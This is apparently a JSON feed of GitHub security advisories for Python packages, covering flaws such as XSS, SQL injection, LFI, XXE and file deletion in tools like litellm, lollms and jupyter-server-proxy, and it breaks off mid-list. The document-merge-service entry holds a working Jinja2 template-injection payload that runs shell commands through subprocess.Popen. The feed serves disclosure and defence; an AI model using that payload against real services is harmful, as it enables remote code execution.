{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<p>WordOps through 3.20.0 has a <code>wo/cli/plugins/stack_pref.py</code> TOCTOU race condition because the <code>conf_path</code> <code>os.open</code> does not use a mode parameter during file creation.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34528\">https://nvd.nist.gov/vuln/detail/CVE-2024-34528</a></li>\n<li><a href=\"https://github.com/WordOps/WordOps/issues/611\">https://github.com/WordOps/WordOps/issues/611</a></li>\n<li><a href=\"https://github.com/WordOps/WordOps/blob/ecf20192c7853925e2cb3f8c8378cd0d86ca0d62/wo/cli/plugins/stack_pref.py#L77\">https://github.com/WordOps/WordOps/blob/ecf20192c7853925e2cb3f8c8378cd0d86ca0d62/wo/cli/plugins/stack_pref.py#L77</a></li>\n<li><a href=\"https://github.com/WordOps/WordOps/commit/31353f0fef14ad8bc1f61c028971bd30b9e1909b\">https://github.com/WordOps/WordOps/commit/31353f0fef14ad8bc1f61c028971bd30b9e1909b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-23qq-p4gq-gc2g\">https://github.com/advisories/GHSA-23qq-p4gq-gc2g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-23qq-p4gq-gc2g",
            "title": "[wordops] WordOps has TOCTOU race condition",
            "date_modified": "2024-06-12T17:20:04.000Z",
            "date_published": "2024-05-06T00:30:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-23qq-p4gq-gc2g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>JupyterHub &lt; 5.0, when used with <code>GlobusOAuthenticator</code>, could be configured to allow all users from a particular institution only. The configuration for this would look like:</p>\n<pre><code class=\"language-python\"># Require users to be using the \"foo.horse\" identity provider, often an institution or university\nc.GlobusAuthenticator.identity_provider = \"foo.horse\"\n# Allow everyone who has that identity provider to log in\nc.GlobusAuthenticator.allow_all = True\n</code></pre>\n<p>This worked fine prior to JupyterHub 5.0, because <code>allow_all</code> <em>did not</em> take precedence over <code>identity_provider</code>.</p>\n<p>Since JupyterHub 5.0, <code>allow_all</code> <em>does</em> take precedence over <code>identity_provider</code>. On a hub with the same config, now <strong>all</strong> users will be allowed to login, regardless of <code>identity_provider</code>. <code>identity_provider</code> will basically be ignored.</p>\n<p>This is a <a href=\"https://jupyterhub.readthedocs.io/en/stable/howto/upgrading-v5.html#authenticator-allow-all-and-allow-existing-users\">documented change</a> in JupyterHub 5.0,\nbut is likely to catch many users by surprise.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>OAuthenticator 16.3.1 fixes the issue with JupyterHub 5.0, and does not affect previous versions.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Do not upgrade to JupyterHub 5.0 when using <code>GlobusOAuthenticator</code> in the prior configuration.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jupyterhub/oauthenticator/security/advisories/GHSA-gprj-3p75-f996\">https://github.com/jupyterhub/oauthenticator/security/advisories/GHSA-gprj-3p75-f996</a></li>\n<li><a href=\"https://github.com/jupyterhub/oauthenticator/commit/d1aea05fa89f2beae15ab0fa0b0d071030f79654\">https://github.com/jupyterhub/oauthenticator/commit/d1aea05fa89f2beae15ab0fa0b0d071030f79654</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gprj-3p75-f996\">https://github.com/advisories/GHSA-gprj-3p75-f996</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gprj-3p75-f996",
            "title": "[oauthenticator] Globus `identity_provider` restriction ignored when used with `allow_all` in JupyterHub 5.0",
            "date_modified": "2024-06-12T17:13:08.000Z",
            "date_published": "2024-06-12T17:13:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gprj-3p75-f996"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>parisneo/lollms version 9.5 is vulnerable to Local File Inclusion (LFI) attacks due to insufficient path sanitization. The <code>sanitize_path_from_endpoint</code> function fails to properly sanitize Windows-style paths (backward slash <code>\\</code>), allowing attackers to perform directory traversal attacks on Windows systems. This vulnerability can be exploited through various routes, including <code>personalities</code> and <code>/del_preset</code>, to read or delete any file on the Windows filesystem, compromising the system's availability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-4315\">https://nvd.nist.gov/vuln/detail/CVE-2024-4315</a></li>\n<li><a href=\"https://github.com/parisneo/lollms/commit/95ad36eeffc6a6be3e3f35ed35a384d768f0ecf6\">https://github.com/parisneo/lollms/commit/95ad36eeffc6a6be3e3f35ed35a384d768f0ecf6</a></li>\n<li><a href=\"https://huntr.com/bounties/8a1b0197-2c36-4276-b92b-630a2a9bb09c\">https://huntr.com/bounties/8a1b0197-2c36-4276-b92b-630a2a9bb09c</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vqwr-q6cc-c242\">https://github.com/advisories/GHSA-vqwr-q6cc-c242</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vqwr-q6cc-c242",
            "title": "[lollms] parisneo/lollms Local File Inclusion (LFI) attack",
            "date_modified": "2024-06-12T17:12:46.000Z",
            "date_published": "2024-06-12T03:31:15.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vqwr-q6cc-c242"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>There is a reflected cross-site scripting (XSS) issue in <code>jupyter-server-proxy</code>[1]. The <code>/proxy</code> endpoint accepts a <code>host</code> path segment in the format <code>/proxy/&lt;host&gt;</code>. When this endpoint is called with an invalid <code>host</code> value, <code>jupyter-server-proxy</code> replies with a response that includes the value of <code>host</code>, without sanitization [2]. A third-party actor can leverage this by sending a phishing link with an invalid <code>host</code> value containing custom JavaScript to a user. When the user clicks this phishing link, the browser renders the response of <code>GET /proxy/&lt;host&gt;</code>, which runs the custom JavaScript contained in <code>host</code> set by the actor.\nAs any arbitrary JavaScript can be run after the user clicks on a phishing link, this issue permits extensive access to the user's JupyterLab instance for an actor. This issue exists in the latest release of <code>jupyter-server-proxy</code>, currently <code>v4.1.2</code>.\n<strong>Impacted versions:</strong> <code>&gt;=3.0.0,&lt;=4.1.2</code></p>\n<h3 id=\"patches\">Patches</h3>\n<p>The patches are included in <code>==4.2.0</code> and <code>==3.2.4</code>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Server operators who are unable to upgrade can disable the <code>jupyter-server-proxy</code> extension with:</p>\n<pre><code>jupyter server extension disable jupyter-server-proxy\n</code></pre>\n<h3 id=\"references\">References</h3>\n<p>[1] : <a href=\"https://github.com/jupyterhub/jupyter-server-proxy/\">https://github.com/jupyterhub/jupyter-server-proxy/</a>\n[2] : <a href=\"https://github.com/jupyterhub/jupyter-server-proxy/blob/62a290f08750f7ae55a0c29ca339c9a39a7b2a7b/jupyter_server_proxy/handlers.py#L328\">https://github.com/jupyterhub/jupyter-server-proxy/blob/62a290f08750f7ae55a0c29ca339c9a39a7b2a7b/jupyter_server_proxy/handlers.py#L328</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-fvcq-4x64-hqxr\">https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-fvcq-4x64-hqxr</a></li>\n<li><a href=\"https://github.com/jupyterhub/jupyter-server-proxy/commit/7abc9dc5bbb0b4b440548a5375261b8b8192fc22\">https://github.com/jupyterhub/jupyter-server-proxy/commit/7abc9dc5bbb0b4b440548a5375261b8b8192fc22</a></li>\n<li><a href=\"https://github.com/jupyterhub/jupyter-server-proxy/commit/ff78128087e73fb9d0909e1366f8bf051e8ea878\">https://github.com/jupyterhub/jupyter-server-proxy/commit/ff78128087e73fb9d0909e1366f8bf051e8ea878</a></li>\n<li><a href=\"https://github.com/jupyterhub/jupyter-server-proxy/blob/62a290f08750f7ae55a0c29ca339c9a39a7b2a7b/jupyter_server_proxy/handlers.py#L328\">https://github.com/jupyterhub/jupyter-server-proxy/blob/62a290f08750f7ae55a0c29ca339c9a39a7b2a7b/jupyter_server_proxy/handlers.py#L328</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fvcq-4x64-hqxr\">https://github.com/advisories/GHSA-fvcq-4x64-hqxr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fvcq-4x64-hqxr",
            "title": "[jupyter-server-proxy] Jupyter Server Proxy has a reflected XSS issue in host parameter",
            "date_modified": "2024-06-11T21:12:48.000Z",
            "date_published": "2024-06-11T21:12:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fvcq-4x64-hqxr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>There is a reflected cross-site scripting (XSS) issue in <code>jupyter-server-proxy</code>[1]. The <code>/proxy</code> endpoint accepts a <code>host</code> path segment in the format <code>/proxy/&lt;host&gt;</code>. When this endpoint is called with an invalid <code>host</code> value, <code>jupyter-server-proxy</code> replies with a response that includes the value of <code>host</code>, without sanitization [2]. A third-party actor can leverage this by sending a phishing link with an invalid <code>host</code> value containing custom JavaScript to a user. When the user clicks this phishing link, the browser renders the response of <code>GET /proxy/&lt;host&gt;</code>, which runs the custom JavaScript contained in <code>host</code> set by the actor.\nAs any arbitrary JavaScript can be run after the user clicks on a phishing link, this issue permits extensive access to the user's JupyterLab instance for an actor. This issue exists in the latest release of <code>jupyter-server-proxy</code>, currently <code>v4.1.2</code>.\n<strong>Impacted versions:</strong> <code>&gt;=3.0.0,&lt;=4.1.2</code></p>\n<h3 id=\"patches\">Patches</h3>\n<p>The patches are included in <code>==4.2.0</code> and <code>==3.2.4</code>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Server operators who are unable to upgrade can disable the <code>jupyter-server-proxy</code> extension with:</p>\n<pre><code>jupyter server extension disable jupyter-server-proxy\n</code></pre>\n<h3 id=\"references\">References</h3>\n<p>[1] : <a href=\"https://github.com/jupyterhub/jupyter-server-proxy/\">https://github.com/jupyterhub/jupyter-server-proxy/</a>\n[2] : <a href=\"https://github.com/jupyterhub/jupyter-server-proxy/blob/62a290f08750f7ae55a0c29ca339c9a39a7b2a7b/jupyter_server_proxy/handlers.py#L328\">https://github.com/jupyterhub/jupyter-server-proxy/blob/62a290f08750f7ae55a0c29ca339c9a39a7b2a7b/jupyter_server_proxy/handlers.py#L328</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-fvcq-4x64-hqxr\">https://github.com/jupyterhub/jupyter-server-proxy/security/advisories/GHSA-fvcq-4x64-hqxr</a></li>\n<li><a href=\"https://github.com/jupyterhub/jupyter-server-proxy/commit/7abc9dc5bbb0b4b440548a5375261b8b8192fc22\">https://github.com/jupyterhub/jupyter-server-proxy/commit/7abc9dc5bbb0b4b440548a5375261b8b8192fc22</a></li>\n<li><a href=\"https://github.com/jupyterhub/jupyter-server-proxy/commit/ff78128087e73fb9d0909e1366f8bf051e8ea878\">https://github.com/jupyterhub/jupyter-server-proxy/commit/ff78128087e73fb9d0909e1366f8bf051e8ea878</a></li>\n<li><a href=\"https://github.com/jupyterhub/jupyter-server-proxy/blob/62a290f08750f7ae55a0c29ca339c9a39a7b2a7b/jupyter_server_proxy/handlers.py#L328\">https://github.com/jupyterhub/jupyter-server-proxy/blob/62a290f08750f7ae55a0c29ca339c9a39a7b2a7b/jupyter_server_proxy/handlers.py#L328</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fvcq-4x64-hqxr\">https://github.com/advisories/GHSA-fvcq-4x64-hqxr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fvcq-4x64-hqxr",
            "title": "[jupyter-server-proxy] Jupyter Server Proxy has a reflected XSS issue in host parameter",
            "date_modified": "2024-06-11T21:12:48.000Z",
            "date_published": "2024-06-11T21:12:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fvcq-4x64-hqxr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>RCE via SSTI, as root, full takeover.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<p>It has not been patched.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<ul>\n<li><a href=\"https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti\">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti</a></li>\n</ul>\n<h3 id=\"poc\">POC</h3>\n<p>Add the following to a document, upload and render it:</p>\n<pre><code class=\"language-jinja2\">{% if PLACEHOLDER.__class__.__mro__[1].__subclasses__()[202] %} \nls -a: {{ PLACEHOLDER.__class__.__mro__[1].__subclasses__()[202](\"ls -a\", shell=True, stdout=-1).communicate()[0].strip() }}\n\nwhoami: {{ PLACEHOLDER.__class__.__mro__[1].__subclasses__()[202](\"whoami\", shell=True, stdout=-1).communicate()[0].strip() }}\n\nuname -a:\n{{ PLACEHOLDER.__class__.__mro__[1].__subclasses__()[202](\"uname -a\", shell=True, stdout=-1).communicate()[0].strip() }}\n\n{% endif %}\n</code></pre>\n<p>The index might be different, so to debug this first render a template with <code>{{ PLACEHOLDER.__class__.__mro__[1].__subclasses__() }}</code> and then get the index of <code>subprocess.Popen</code> and replace 202 with that.</p>\n<p><img alt=\"image\" src=\"https://github.com/adfinis/document-merge-service/assets/110528300/0a1dfcff-2eba-40f1-af9c-08c8ec2bc0a1\"></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/adfinis/document-merge-service/security/advisories/GHSA-v5gf-r78h-55q6\">https://github.com/adfinis/document-merge-service/security/advisories/GHSA-v5gf-r78h-55q6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37301\">https://nvd.nist.gov/vuln/detail/CVE-2024-37301</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v5gf-r78h-55q6\">https://github.com/advisories/GHSA-v5gf-r78h-55q6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v5gf-r78h-55q6",
            "title": "[document-merge-service] document-merge-service vulnerable to Remote Code Execution via Server-Side Template Injection",
            "date_modified": "2024-06-11T21:38:53.000Z",
            "date_published": "2024-06-11T20:22:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v5gf-r78h-55q6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Azure Identity Libraries and Microsoft Authentication Library Elevation of Privilege Vulnerability </p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-35255\">https://nvd.nist.gov/vuln/detail/CVE-2024-35255</a></li>\n<li><a href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35255\">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35255</a></li>\n<li><a href=\"https://github.com/Azure/azure-sdk-for-go/commit/50774cd9709905523136fb05e8c85a50e8984499\">https://github.com/Azure/azure-sdk-for-go/commit/50774cd9709905523136fb05e8c85a50e8984499</a></li>\n<li><a href=\"https://github.com/Azure/azure-sdk-for-js/commit/c6aa75d312ae463e744163cedfd8fc480cc8d492\">https://github.com/Azure/azure-sdk-for-js/commit/c6aa75d312ae463e744163cedfd8fc480cc8d492</a></li>\n<li><a href=\"https://github.com/Azure/azure-sdk-for-python/commit/cb065acd7d0f957327dc4f02d1646d4e51a94178\">https://github.com/Azure/azure-sdk-for-python/commit/cb065acd7d0f957327dc4f02d1646d4e51a94178</a></li>\n<li><a href=\"https://github.com/Azure/azure-sdk-for-java/commit/5bf020d6ea056de40e2738e3647a4e06f902c18d\">https://github.com/Azure/azure-sdk-for-java/commit/5bf020d6ea056de40e2738e3647a4e06f902c18d</a></li>\n<li><a href=\"https://github.com/Azure/azure-sdk-for-net/commit/9279a4f38bf69b457cfb9b354f210e0a540a5c53\">https://github.com/Azure/azure-sdk-for-net/commit/9279a4f38bf69b457cfb9b354f210e0a540a5c53</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m5vv-6r4h-3vj9\">https://github.com/advisories/GHSA-m5vv-6r4h-3vj9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m5vv-6r4h-3vj9",
            "title": "[azure-identity] Azure Identity Libraries and Microsoft Authentication Library Elevation of Privilege Vulnerability",
            "date_modified": "2024-06-12T17:18:05.000Z",
            "date_published": "2024-06-11T18:30:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m5vv-6r4h-3vj9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Langflow through 0.6.19 allows remote code execution if untrusted users are able to reach the \"POST /api/v1/custom_component\" endpoint and provide a Python script.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37014\">https://nvd.nist.gov/vuln/detail/CVE-2024-37014</a></li>\n<li><a href=\"https://github.com/langflow-ai/langflow/issues/1973\">https://github.com/langflow-ai/langflow/issues/1973</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qg33-x2c5-6p44\">https://github.com/advisories/GHSA-qg33-x2c5-6p44</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qg33-x2c5-6p44",
            "title": "[langflow] Langflow remote code execution vulnerability",
            "date_modified": "2024-06-11T19:29:17.000Z",
            "date_published": "2024-06-10T21:30:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qg33-x2c5-6p44"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In lunary-ai/lunary version 1.2.13, an insufficient granularity of access control vulnerability allows users to create, update, get, and delete prompt variations for datasets not owned by their organization. This issue arises due to the application not properly validating the ownership of dataset prompts and their variations against the organization or project of the requesting user. As a result, unauthorized modifications to dataset prompts can occur, leading to altered or removed dataset prompts without proper authorization. This vulnerability impacts the integrity and consistency of dataset information, potentially affecting the results of experiments.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-5389\">https://nvd.nist.gov/vuln/detail/CVE-2024-5389</a></li>\n<li><a href=\"https://huntr.com/bounties/3ca5309f-5615-4d5b-8043-968af220d7a2\">https://huntr.com/bounties/3ca5309f-5615-4d5b-8043-968af220d7a2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3mwc-2cj7-gx8c\">https://github.com/advisories/GHSA-3mwc-2cj7-gx8c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3mwc-2cj7-gx8c",
            "title": "[lunary] lunary-ai/lunary Access Control Vulnerability in Prompt Variation Management",
            "date_modified": "2024-06-10T18:36:37.000Z",
            "date_published": "2024-06-10T00:30:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3mwc-2cj7-gx8c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability in zenml-io/zenml version 0.56.3 allows attackers to reuse old session credentials or session IDs due to insufficient session expiration. Specifically, the session does not expire after a password change, enabling an attacker to maintain access to a compromised account without the victim's ability to revoke this access. This issue was observed in a self-hosted ZenML deployment via Docker, where after changing the password from one browser, the session remained active and usable in another browser without requiring re-authentication.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-4680\">https://nvd.nist.gov/vuln/detail/CVE-2024-4680</a></li>\n<li><a href=\"https://huntr.com/bounties/c88f6bd2-490d-4930-98dd-03651b20230a\">https://huntr.com/bounties/c88f6bd2-490d-4930-98dd-03651b20230a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-99hm-86h7-gr3g\">https://github.com/advisories/GHSA-99hm-86h7-gr3g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-99hm-86h7-gr3g",
            "title": "[zenml] zenml-io/zenml does not expire the session after password reset",
            "date_modified": "2024-06-10T18:36:32.000Z",
            "date_published": "2024-06-08T21:30:38.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-99hm-86h7-gr3g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>lepture Authlib before 1.3.1 has algorithm confusion with asymmetric public keys. Unless an algorithm is specified in a jwt.decode call, HMAC verification is allowed with any asymmetric public key. (This is similar to CVE-2022-29217 and CVE-2024-33663.)</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37568\">https://nvd.nist.gov/vuln/detail/CVE-2024-37568</a></li>\n<li><a href=\"https://github.com/lepture/authlib/issues/654\">https://github.com/lepture/authlib/issues/654</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/authlib/PYSEC-2024-52.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/authlib/PYSEC-2024-52.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5357-c2jx-v7qh\">https://github.com/advisories/GHSA-5357-c2jx-v7qh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5357-c2jx-v7qh",
            "title": "[authlib] Authlib has algorithm confusion with asymmetric public keys",
            "date_modified": "2024-06-10T15:59:19.000Z",
            "date_published": "2024-06-09T21:30:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5357-c2jx-v7qh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An XML External Entity (XXE) vulnerability in the <code>ebookmeta.get_metadata</code> function via lxml dependency allows attackers to access sensitive information or cause a Denial of Service (DoS) via crafted XML input.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37388\">https://nvd.nist.gov/vuln/detail/CVE-2024-37388</a></li>\n<li><a href=\"https://github.com/dnkorpushov/ebookmeta/issues/16#issue-2317712335\">https://github.com/dnkorpushov/ebookmeta/issues/16#issue-2317712335</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hx54-pf28-7xch\">https://github.com/advisories/GHSA-hx54-pf28-7xch</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hx54-pf28-7xch",
            "title": "[ebookmeta] ebookmeta XML External Entity vulnerability",
            "date_modified": "2024-06-07T21:54:47.000Z",
            "date_published": "2024-06-07T21:31:54.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hx54-pf28-7xch"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An XML External Entity (XXE) vulnerability in the <code>ebookmeta.get_metadata</code> function of ebookmeta before v1.2.8 allows attackers to access sensitive information or cause a Denial of Service (DoS) via crafted XML input.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-36827\">https://nvd.nist.gov/vuln/detail/CVE-2024-36827</a></li>\n<li><a href=\"https://github.com/dnkorpushov/ebookmeta/issues/16#issue-2317712335\">https://github.com/dnkorpushov/ebookmeta/issues/16#issue-2317712335</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-whf4-fpj8-pgg8\">https://github.com/advisories/GHSA-whf4-fpj8-pgg8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-whf4-fpj8-pgg8",
            "title": "[ebookmeta] ebookmeta XML External Entity vulnerability",
            "date_modified": "2024-06-07T21:54:41.000Z",
            "date_published": "2024-06-07T21:31:54.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-whf4-fpj8-pgg8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In h2oai/h2o-3 version 3.40.0.4, an exposure of sensitive information vulnerability exists due to an arbitrary system path lookup feature. This vulnerability allows any remote user to view full paths in the entire file system where h2o-3 is hosted. Specifically, the issue resides in the Typeahead API call, which when requested with a typeahead lookup of '/', exposes the root filesystem including directories such as /home, /usr, /bin, among others. This vulnerability could allow attackers to explore the entire filesystem, and when combined with a Local File Inclusion (LFI) vulnerability, could make exploitation of the server trivial.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-5550\">https://nvd.nist.gov/vuln/detail/CVE-2024-5550</a></li>\n<li><a href=\"https://huntr.com/bounties/e76372c2-39be-4984-a7c8-7048a75a25dc\">https://huntr.com/bounties/e76372c2-39be-4984-a7c8-7048a75a25dc</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x234-r5fg-x52m\">https://github.com/advisories/GHSA-x234-r5fg-x52m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x234-r5fg-x52m",
            "title": "[h2o] Arbitrary system path lookup in h20",
            "date_modified": "2024-06-06T22:57:23.000Z",
            "date_published": "2024-06-06T21:30:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x234-r5fg-x52m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>BerriAI's litellm, in its latest version, is vulnerable to arbitrary file deletion due to improper input validation on the <code>/audio/transcriptions</code> endpoint. An attacker can exploit this vulnerability by sending a specially crafted request that includes a file path to the server, which then deletes the specified file without proper authorization or validation. This vulnerability is present in the code where <code>os.remove(file.filename)</code> is used to delete a file, allowing any user to delete critical files on the server such as SSH keys, SQLite databases, or configuration files. </p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-4888\">https://nvd.nist.gov/vuln/detail/CVE-2024-4888</a></li>\n<li><a href=\"https://huntr.com/bounties/48461d89-cf13-4ad3-a43e-0d37da08fc6c\">https://huntr.com/bounties/48461d89-cf13-4ad3-a43e-0d37da08fc6c</a></li>\n<li><a href=\"https://github.com/BerriAI/litellm/pull/3193\">https://github.com/BerriAI/litellm/pull/3193</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3xr8-qfvj-9p9j\">https://github.com/advisories/GHSA-3xr8-qfvj-9p9j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3xr8-qfvj-9p9j",
            "title": "[litellm] Arbitrary file deletion in litellm",
            "date_modified": "2024-06-06T22:55:47.000Z",
            "date_published": "2024-06-06T21:30:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3xr8-qfvj-9p9j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An SQL Injection vulnerability exists in the berriai/litellm repository, specifically within the <code>/global/spend/logs</code> endpoint. The vulnerability arises due to improper neutralization of special elements used in an SQL command. The affected code constructs an SQL query by concatenating an unvalidated <code>api_key</code> parameter directly into the query, making it susceptible to SQL Injection if the <code>api_key</code> contains malicious data. This issue affects the latest version of the repository. Successful exploitation of this vulnerability could lead to unauthorized access, data manipulation, exposure of confidential information, and denial of service (DoS).</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-5225\">https://nvd.nist.gov/vuln/detail/CVE-2024-5225</a></li>\n<li><a href=\"https://huntr.com/bounties/491e4884-0306-4cd4-8fe2-9a19de33bf5c\">https://huntr.com/bounties/491e4884-0306-4cd4-8fe2-9a19de33bf5c</a></li>\n<li><a href=\"https://github.com/BerriAI/litellm/pull/3940\">https://github.com/BerriAI/litellm/pull/3940</a></li>\n<li><a href=\"https://github.com/BerriAI/litellm/commit/f75c15d6cd535aa78014378ad532de1df6be2f56\">https://github.com/BerriAI/litellm/commit/f75c15d6cd535aa78014378ad532de1df6be2f56</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h6m6-jj8v-94jj\">https://github.com/advisories/GHSA-h6m6-jj8v-94jj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h6m6-jj8v-94jj",
            "title": "[litellm] SQL injection in litellm",
            "date_modified": "2024-06-06T22:54:22.000Z",
            "date_published": "2024-06-06T21:30:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h6m6-jj8v-94jj"
            },
            "tags": [
                "severity"
            ]
        },
        {
